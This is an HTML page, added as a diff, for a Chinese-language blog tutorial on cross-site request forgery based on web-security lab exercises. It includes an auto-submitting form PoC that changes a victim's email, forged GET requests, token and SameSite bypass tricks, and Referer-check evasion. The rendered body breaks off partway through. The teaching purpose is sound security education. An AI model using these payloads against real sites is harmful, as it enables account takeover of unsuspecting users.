@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CSRF | All-on&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="跨站请求伪造（也称为CSRF，Cross-site request forgery）是一种网络安全漏洞，允许攻击者诱使用户执行他们不打算执行的行为。它允许攻击者部分规避相同的源头策略，该策略旨在防止不同网站相互干扰。
+CSRF需要3个条件：">
+<meta name="author" content="All-on">
+<link rel="canonical" href="https://all-on.github.io/posts/web/csrf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.4f7a70c28f67918d50819ad94370c535de5b6f0d6c6299d10477402264aea5fd.css" integrity="sha256-T3pwwo9nkY1QgZrZQ3DFNd5bbw1sYpnRBHdAImSupf0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://all-on.github.io/images/site-icon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://all-on.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://all-on.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://all-on.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://all-on.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh-cn" href="https://all-on.github.io/posts/web/csrf/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" crossorigin="anonymous"><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js" crossorigin="anonymous"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js" crossorigin="anonymous"
+    onload="renderMathInElement(document.body, {
+        delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '\\[', right: '\\]', display: true},
+            {left: '\\(', right: '\\)', display: false},
+            {left: '$', right: '$', display: false}
+        ],
+        throwOnError: false,
+        ignoredTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+        ignoredClasses: ['entry-content']
+    });"></script>
+<meta property="og:url" content="https://all-on.github.io/posts/web/csrf/">
+  <meta property="og:site_name" content="All-on&#39;s Blog">
+  <meta property="og:title" content="CSRF">
+  <meta property="og:description" content="跨站请求伪造（也称为CSRF，Cross-site request forgery）是一种网络安全漏洞，允许攻击者诱使用户执行他们不打算执行的行为。它允许攻击者部分规避相同的源头策略，该策略旨在防止不同网站相互干扰。 CSRF需要3个条件：">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-01T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CSRF">
+  <meta name="twitter:description" content="跨站请求伪造（也称为CSRF，Cross-site request forgery）是一种网络安全漏洞，允许攻击者诱使用户执行他们不打算执行的行为。它允许攻击者部分规避相同的源头策略，该策略旨在防止不同网站相互干扰。 CSRF需要3个条件：">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://all-on.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CSRF",
+      "item": "https://all-on.github.io/posts/web/csrf/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CSRF",
+  "name": "CSRF",
+  "description": "跨站请求伪造（也称为CSRF，Cross-site request forgery）是一种网络安全漏洞，允许攻击者诱使用户执行他们不打算执行的行为。它允许攻击者部分规避相同的源头策略，该策略旨在防止不同网站相互干扰。 CSRF需要3个条件：\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "跨站请求伪造（也称为CSRF，Cross-site request forgery）是一种网络安全漏洞，允许攻击者诱使用户执行他们不打算执行的行为。它允许攻击者部分规避相同的源头策略，该策略旨在防止不同网站相互干扰。 CSRF需要3个条件：\n一个相关的行动。在应用中，攻击者有理由诱导某个动作。这可能是特权作（例如修改其他用户的权限）或对用户特定数据的任何作（例如更改用户自己的密码）。 基于Cookie的会话处理。CSRF通常以基于cookie的会话处理为基础来描述，但它也出现在应用程序自动为请求添加某些用户凭证的情境中，如HTTP Basic认证和基于证书的认证。 没有不可预测的请求参数。 无防御的 CSRF 漏洞 如果一个应用程序包含一个功能，允许用户更改账户中的电子邮件地址，且该过程符合CSRF的3个要求。攻击者可以构建包含以下HTML的网页：\n1\u003chtml\u003e 2 \u003cbody\u003e 3 \u003cform action=\"https://vulnerable-website.com/email/change\" method=\"POST\"\u003e 4 \u003cinput type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" /\u003e 5 \u003c/form\u003e 6 \u003cscript\u003e 7 document.forms[0].submit(); 8 \u003c/script\u003e 9 \u003c/body\u003e 10\u003c/html\u003e 如果受害者用户访问攻击者的网页，攻击者的页面会触发对受攻击网站的HTTP请求。如果用户登录了易受攻击的网站，其浏览器会自动在请求中包含会话Cookie。受攻击的网站会以正常方式处理请求，视为受害用户发出，并更改其电子邮件地址。\n要快速利用CSRF漏洞，可以使用Burp的右键“参与度工具”-\u003e“CSRF PoC”。\n例如，对于这样一个没有防御措施的CSRF漏洞，完全可以在更改邮件地址的时候抓包，生成利用漏洞的html。当然，需要勾选“包括自动提交脚本”选项，并将更新后的邮件地址改一下即可。\n绕过 CSRF 令牌验证 防御CSRF攻击最有效的方法是在相关请求中包含CSRF令牌。该令牌必须满足以下条件：\n高熵时，这种不可预测性，就像会话令牌一样。 绑定在用户会话。 在执行相关操作前，在每种情况下都经过严格验证。 CSRF 令牌应被视为机密，并在整个生命周期内以安全方式处理。一种通常有效的方法是通过POST方法提交的HTML表单中的隐藏字段内将令牌传输给客户端。随后，该令牌将在表单提交时作为请求参数包含：\n1 为了进一步安全，包含CSRF令牌的字段应尽早放置在HTML文档中，理想情况下应放在任何非隐藏输入字段之前，以及HTML中嵌入用户可控制数据的位置之前。另一种方法是将令牌放入 URL 查询字符串中，安全性较差。\n依赖于请求方法 有些应用程序在请求使用 POST 方法时正确验证令牌，但使用 GET 方法时跳过验证。在这种情况下，攻击者可以切换到GET方法绕过验证，发动CSRF攻击：\n1GET /email/change?email=pwned@evil-user.net HTTP/1.1 2Host: vulnerable-website.com 3Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm 例如，在更改邮件地址的时候，可以更改请求方法为GET之后，再生成CSRF PoC进行攻击。\n依赖于令牌的存在 有些应用程序在令牌存在时会正确验证，但如果遗漏令牌则跳过验证。\n例如，在更改邮件地址的时候，直接删除csrf参数。\n不绑定用户会话 有些程序不会验证令牌是否属于发送请求的用户的同一个会话。相反，应用维护一个其已发行的全局令牌池，并接受该池中出现的任何令牌。于是，可以用自己的账户登录应用，获取有效的令牌，然后将该令牌传递给受害者用户进行CSRF攻击。\n例如，分别登录两个账户之后，对其中一个抓包。记录其csrf值之后丢弃。然后抓包另一个账户，覆盖csrf值并生成PoC。\n绑定在非会话 cookie 上 当应用采用两个不同的框架时，很容易发生CSRF令牌绑定到一个Cookie上，但不绑定用于跟踪会话的同一个Cookie的情况。一个用于会话处理，另一个用于CSRF保护，且两者未集成。比如：\n1POST /email/change HTTP/1.1 2Host: vulnerable-website.com 3Content-Type: application/x-www-form-urlencoded 4Content-Length: 68 5Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv 6 7csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY\u0026email=wiener@normal-user.com 其中，Cookie中的csrfKey值就与csrf令牌关联，但不与Cookie本身关联。于是，可以将攻击者账户的csrfKey值与csrf值完整覆盖第1个用户的，从而实现CSRF攻击。\n例如，将第2个账户的两个值都覆盖第1个账户之后，需要在CSRF PoC中进行调整。将自动提交的 这说明，浏览器在第二个请求中包含了已验证的会话 cookie。第1个请求是从漏洞服务器到 /post/comment/confirmation?postId=1 ，属于跨站请求；第2个请求是到 /my-account ，属于同站请求。接着查看修改邮件地址的页面，把 POST 方法更改为 GET 方法居然能够成功。于是，直接构造payload进行攻击：\n1 这里为了避免干扰 postId 参数解析，对 \u0026 进行了 URL 编码。\ncookie 刷新绕过 Lax 如前所述，如果网站在设置 cookie 时未包含 SameSite 属性，Chrome 默认会自动应用 Lax 限制。然而，为了避免破坏单点登录 (SSO) 机制，它实际上不会对顶级 POST 请求在最初的 120 秒强制执行这些限制。因此，用户可能在两分钟的时间窗口内容易受到跨站攻击。但是，在2分钟内完成所有攻击有点仓促。于是，有两种思路。一个是，如果能在网站上找到一个小工具，强制受害者获取新的会话cookie，那就可以在进行主要攻击之前提前刷新他们的cookie。例如，完成基于OAuth的登录流程可能每次都会产生一个新的会话，因为OAuth服务不一定知道用户是否仍然登录到目标网站。让用户离开当前页面去 OAuth 登录，完成后再返回，但这样会打断攻击流程，且需要用户配合返回。另一个是，从新标签页触发Cookie刷新，这样浏览器就不会在发动最终攻击前离开页面。但是，这个弹窗默认会被浏览器屏蔽：\n1window.open('https://vulnerable-website.com/login/sso'); 为了绕过这个问题，可以用事件处理程序onclick将语句包装如下：\n1window.onclick = () =\u003e { window.open('https://vulnerable-website.com/login/sso'); } 例如，对于使用 OAuth 流程登录账号，发现更改电子邮件的页面没有 csrf 令牌，这就可能受到攻击。登录的2分钟内，用普通的 PoC 放在漏洞利用服务器中，发现确实能够更改邮件地址。这说明时间窗口的存在，攻击者需要刷新会话以重置窗口。然后，利用 /social-login 刷新会话。 /social-login 会自动启动OAuth流程，即使用户已登录，也会重新认证并设置新的会话Cookie。于是，采用下面的payload：\n1 2 3 4Click anywhere on the page\n5 查看漏洞利用效果时，点击任意一处即可触发。\n绕过基于Referer的CSRF防御 除了使用 CSRF 令牌的防御之外，一些应用程序还会使用 HTTP Referer 头来尝试防御 CSRF 攻击，通常通过验证请求是否来自应用程序自己的域。这种方法通常效果较差，并且经常容易被绕过。\nReferer的验证依赖于头部的存在 一些应用程序在请求中存在 Referer 头时会验证它，但如果省略该头则跳过验证。在这种情况下，攻击者可以以某种方式构造他们的 CSRF 利用，使受害用户的浏览器在生成的请求中丢弃 Referer 头。实现这一点的方法有很多，但最简单的方法是在托管 CSRF 攻击的 HTML 页面中使用 META 标签：\n1 例如，在更改电子邮件地址的页面，发现改动 Referer 头，请求会被拒绝，但是删除又会被接受。所以，在生成的 PoC 中添加上面的META标签即可。\nReferer验证失效 一些应用程序以一种简单粗暴的方式验证 Referer 头，这种方式可能被绕过。例如，如果应用程序验证 Referer 中的域名以预期值开头，攻击者就可以将其作为自己域名的子域名放置。同样，如果应用程序只是验证 Referer 是否包含其自身的域名，攻击者就可以在 URL 的其他位置放置所需的值：\n1http://attacker-website.com/csrf-attack?vulnerable-website.com 但是，许多浏览器现在默认会从 Referer 头中去掉查询字符串。可以通过确保包含漏洞利用的响应设置了 Referrer-Policy: unsafe-url 头来覆盖此行为。这将确保发送完整的 URL，包括查询字符串。\n例如，在更改邮件地址的页面，发现网站能够接受任何包含有预期域名的 Referer 头。比如：\n1Referer: https://incorrect.net?YOUR-LAB-ID.web-security-academy.net 这样能够被接受。于是，在生成的 PoC 中修改一处：\n1 这里的 history.pushState() 是在不刷新页面的情况下改变浏览器地址栏的 URL。但是，因为许多浏览器现在默认会从Referer头中移除查询字符串以作为安全措施。所以，为了覆盖此行为并确保请求中包含完整URL，还需要在漏洞利用服务器的“头部”里添加 Referrer-Policy: unsafe-url 头。\n",
+  "wordCount" : "4562",
+  "inLanguage": "zh-cn",
+  "datePublished": "2026-05-01T00:00:00Z",
+  "dateModified": "2026-05-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "All-on"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://all-on.github.io/posts/web/csrf/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All-on's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://all-on.github.io/images/site-icon.jpg"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="https://all-on.github.io/" accesskey="h" title="All-on&#39;s Blog (Alt + H)">
+                <img src="https://all-on.github.io/images/site-icon.jpg" alt="" aria-label="logo"
+                    height="35">All-on&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="https://all-on.github.io/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://all-on.github.io/posts/" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://all-on.github.io/categories/" title="类别">
+                    <span>类别</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://all-on.github.io/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://all-on.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/posts/">Posts</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      CSRF
+      <span class="entry-hint" title="Draft">
+        <svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentColor">
+          <path
+            d="M160-410v-60h300v60H160Zm0-165v-60h470v60H160Zm0-165v-60h470v60H160Zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22q0 11-4.5 22.5T862.09-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z" />
+        </svg>
+      </span>
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-05-01 00:00:00 +0000 UTC'>2026-05-01</span>&nbsp;·&nbsp;<span>10 min</span>&nbsp;·&nbsp;<span>4562 words</span>&nbsp;·&nbsp;<span>All-on</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+<div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e6%97%a0%e9%98%b2%e5%be%a1%e7%9a%84-csrf-%e6%bc%8f%e6%b4%9e" aria-label="无防御的 CSRF 漏洞">无防御的 CSRF 漏洞</a></li>
+                <li>
+                    <a href="#%e7%bb%95%e8%bf%87-csrf-%e4%bb%a4%e7%89%8c%e9%aa%8c%e8%af%81" aria-label="绕过 CSRF 令牌验证">绕过 CSRF 令牌验证</a><ul>
+                        
+                <li>
+                    <a href="#%e4%be%9d%e8%b5%96%e4%ba%8e%e8%af%b7%e6%b1%82%e6%96%b9%e6%b3%95" aria-label="依赖于请求方法">依赖于请求方法</a></li>
+                <li>
+                    <a href="#%e4%be%9d%e8%b5%96%e4%ba%8e%e4%bb%a4%e7%89%8c%e7%9a%84%e5%ad%98%e5%9c%a8" aria-label="依赖于令牌的存在">依赖于令牌的存在</a></li>
+                <li>
+                    <a href="#%e4%b8%8d%e7%bb%91%e5%ae%9a%e7%94%a8%e6%88%b7%e4%bc%9a%e8%af%9d" aria-label="不绑定用户会话">不绑定用户会话</a></li>
+                <li>
+                    <a href="#%e7%bb%91%e5%ae%9a%e5%9c%a8%e9%9d%9e%e4%bc%9a%e8%af%9d-cookie-%e4%b8%8a" aria-label="绑定在非会话 cookie 上">绑定在非会话 cookie 上</a></li>
+                <li>
+                    <a href="#cookie-%e4%b8%ad%e9%87%8d%e5%a4%8d%e4%bb%a4%e7%89%8c" aria-label="Cookie 中重复令牌">Cookie 中重复令牌</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e7%bb%95%e8%bf%87samesite-cookie%e9%99%90%e5%88%b6" aria-label="绕过SameSite cookie限制">绕过SameSite cookie限制</a><ul>
+                        
+                <li>
+                    <a href="#get%e6%96%b9%e6%b3%95%e7%bb%95%e8%bf%87-lax" aria-label="GET方法绕过 Lax">GET方法绕过 Lax</a></li>
+                <li>
+                    <a href="#%e9%87%8d%e5%ae%9a%e5%90%91%e7%bb%95%e8%bf%87-strict" aria-label="重定向绕过 Strict">重定向绕过 Strict</a></li>
+                <li>
+                    <a href="#cookie-%e5%88%b7%e6%96%b0%e7%bb%95%e8%bf%87-lax" aria-label="cookie 刷新绕过 Lax">cookie 刷新绕过 Lax</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e7%bb%95%e8%bf%87%e5%9f%ba%e4%ba%8ereferer%e7%9a%84csrf%e9%98%b2%e5%be%a1" aria-label="绕过基于Referer的CSRF防御">绕过基于Referer的CSRF防御</a><ul>
+                        
+                <li>
+                    <a href="#referer%e7%9a%84%e9%aa%8c%e8%af%81%e4%be%9d%e8%b5%96%e4%ba%8e%e5%a4%b4%e9%83%a8%e7%9a%84%e5%ad%98%e5%9c%a8" aria-label="Referer的验证依赖于头部的存在">Referer的验证依赖于头部的存在</a></li>
+                <li>
+                    <a href="#referer%e9%aa%8c%e8%af%81%e5%a4%b1%e6%95%88" aria-label="Referer验证失效">Referer验证失效</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    window.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+         
+         activeElement = elements[0];
+         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+     }, false);
+
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+
+    window.addEventListener('scroll', () => {
+        
+        activeElement = Array.from(elements).find((element) => {
+            if ((getOffsetTop(element) - window.pageYOffset) > 0 &&
+                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
+                return element;
+            }
+        }) || activeElement
+
+        elements.forEach(element => {
+             const id = encodeURI(element.getAttribute('id')).toLowerCase();
+             if (element === activeElement){
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+             } else {
+                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
+             }
+         })
+     }, false);
+
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;
+    }
+</script>
+
+  <div class="post-content md-content"><p>跨站请求伪造（也称为CSRF，Cross-site request forgery）是一种网络安全漏洞，允许攻击者诱使用户执行他们不打算执行的行为。它允许攻击者部分规避相同的源头策略，该策略旨在防止不同网站相互干扰。
+CSRF需要3个条件：</p>
+<ul>
+<li><strong>一个相关的行动</strong>。在应用中，攻击者有理由诱导某个动作。这可能是特权作（例如修改其他用户的权限）或对用户特定数据的任何作（例如更改用户自己的密码）。</li>
+<li><strong>基于Cookie的会话处理</strong>。CSRF通常以基于cookie的会话处理为基础来描述，但它也出现在应用程序自动为请求添加某些用户凭证的情境中，如HTTP Basic认证和基于证书的认证。</li>
+<li><strong>没有不可预测的请求参数</strong>。</li>
+</ul>
+<h2 id="无防御的-csrf-漏洞">无防御的 CSRF 漏洞<a hidden class="anchor" aria-hidden="true" href="#无防御的-csrf-漏洞">#</a></h2>
+<p>如果一个应用程序包含一个功能，允许用户更改账户中的电子邮件地址，且该过程符合CSRF的3个要求。攻击者可以构建包含以下HTML的网页：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;https://vulnerable-website.com/email/change&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;pwned@evil-user.net&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>如果受害者用户访问攻击者的网页，攻击者的页面会触发对受攻击网站的HTTP请求。如果用户登录了易受攻击的网站，其浏览器会自动在请求中包含会话Cookie。受攻击的网站会以正常方式处理请求，视为受害用户发出，并更改其电子邮件地址。</p>
+<p>要快速利用CSRF漏洞，可以使用Burp的右键<code>“参与度工具”-&gt;“CSRF PoC”</code>。</p>
+<p>例如，对于这样一个没有防御措施的CSRF漏洞，完全可以在更改邮件地址的时候抓包，生成利用漏洞的html。当然，需要勾选“包括自动提交脚本”选项，并将更新后的邮件地址改一下即可。</p>
+<h2 id="绕过-csrf-令牌验证">绕过 CSRF 令牌验证<a hidden class="anchor" aria-hidden="true" href="#绕过-csrf-令牌验证">#</a></h2>
+<p>防御CSRF攻击最有效的方法是在相关请求中包含CSRF令牌。该令牌必须满足以下条件：</p>
+<ul>
+<li>高熵时，这种不可预测性，就像会话令牌一样。</li>
+<li>绑定在用户会话。</li>
+<li>在执行相关操作前，在每种情况下都经过严格验证。</li>
+</ul>
+<p>CSRF 令牌应被视为机密，并在整个生命周期内以安全方式处理。一种通常有效的方法是通过POST方法提交的HTML表单中的隐藏字段内将令牌传输给客户端。随后，该令牌将在表单提交时作为请求参数包含：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;input type=&#34;hidden&#34; name=&#34;csrf-token&#34; value=&#34;CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&#34; /&gt;
+</span></span></code></pre></div><p>为了进一步安全，包含CSRF令牌的字段应尽早放置在HTML文档中，理想情况下应放在任何非隐藏输入字段之前，以及HTML中嵌入用户可控制数据的位置之前。另一种方法是将令牌放入 URL 查询字符串中，安全性较差。</p>
+<h3 id="依赖于请求方法">依赖于请求方法<a hidden class="anchor" aria-hidden="true" href="#依赖于请求方法">#</a></h3>
+<p>有些应用程序在请求使用 POST 方法时正确验证令牌，但使用 GET 方法时跳过验证。在这种情况下，攻击者可以切换到GET方法绕过验证，发动CSRF攻击：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /email/change?email=pwned@evil-user.net HTTP/1.1
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Host: vulnerable-website.com
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+</span></span></code></pre></div><p>例如，在更改邮件地址的时候，可以更改请求方法为<code>GET</code>之后，再生成<code>CSRF PoC</code>进行攻击。</p>
+<h3 id="依赖于令牌的存在">依赖于令牌的存在<a hidden class="anchor" aria-hidden="true" href="#依赖于令牌的存在">#</a></h3>
+<p>有些应用程序在令牌存在时会正确验证，但如果遗漏令牌则跳过验证。</p>
+<p>例如，在更改邮件地址的时候，直接删除<code>csrf</code>参数。</p>
+<h3 id="不绑定用户会话">不绑定用户会话<a hidden class="anchor" aria-hidden="true" href="#不绑定用户会话">#</a></h3>
+<p>有些程序不会验证令牌是否属于发送请求的用户的同一个会话。相反，应用维护一个其已发行的全局令牌池，并接受该池中出现的任何令牌。于是，可以用自己的账户登录应用，获取有效的令牌，然后将该令牌传递给受害者用户进行CSRF攻击。</p>
+<p>例如，分别登录两个账户之后，对其中一个抓包。记录其<code>csrf</code>值之后丢弃。然后抓包另一个账户，覆盖<code>csrf</code>值并生成<code>PoC</code>。</p>
+<h3 id="绑定在非会话-cookie-上">绑定在非会话 cookie 上<a hidden class="anchor" aria-hidden="true" href="#绑定在非会话-cookie-上">#</a></h3>
+<p>当应用采用两个不同的框架时，很容易发生CSRF令牌绑定到一个Cookie上，但不绑定用于跟踪会话的同一个Cookie的情况。一个用于会话处理，另一个用于CSRF保护，且两者未集成。比如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">POST /email/change HTTP/1.1
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Host: vulnerable-website.com
